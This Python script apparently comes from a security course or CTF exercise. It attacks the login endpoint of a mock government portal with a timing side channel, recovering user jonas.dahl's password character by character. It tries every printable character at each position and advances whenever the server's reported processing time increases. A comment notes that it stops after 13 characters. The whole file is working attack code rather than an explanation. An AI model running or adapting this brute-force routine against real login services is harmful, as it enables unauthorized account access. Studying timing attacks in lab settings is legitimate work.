import requests
import time
import string


#Creating a list of all letters
characters = list(string.ascii_letters + string.digits + string.punctuation + string.whitespace)

#define the iterator of the character list
iterator = iter(characters)

#Set url
url = 'http://portal.regjeringen.uiaikt.no/login'

#Set the base input string with password length of 17 characters
input_string = {"username":"jonas.dahl","password":"11111111111111111"}

#The integer of which character to change in the password
base_number = 0

#Set the base answer
answer = '{"result": "incorrect", "total_time": 0}'

#Set the base response for the post requests
response = 'incorrect'

#Reset condition is the processing time of the password
reset_condition = '2'



while response in answer:
    time.sleep(0.01)  # Introduce a 0.01-second delay

    #Loops through all the characters
    x = next(iterator)
    #Concatenates parts of the input string with the replacement character str(x)
    input_string["password"] = (
        input_string["password"][:base_number] + str(x) + input_string["password"][base_number + 1:]
    )
    print(input_string)

    #Send the post request and read the answer
    semi_answer = requests.post(url, json = input_string)
    answer = semi_answer.text
    print(answer)

    if reset_condition in answer:
        #increments the numbers for what character to replace in the input
        base_number += 1
        #Increments the processing time of the password
        reset_condition = str(int(reset_condition) + 1)

        #Essentially resets the for loop
        iterator = iter(characters)

#For some unnown reasons this code could only find the first 13 characters so it wont print the Final Answer
#Final Answer
print(answer)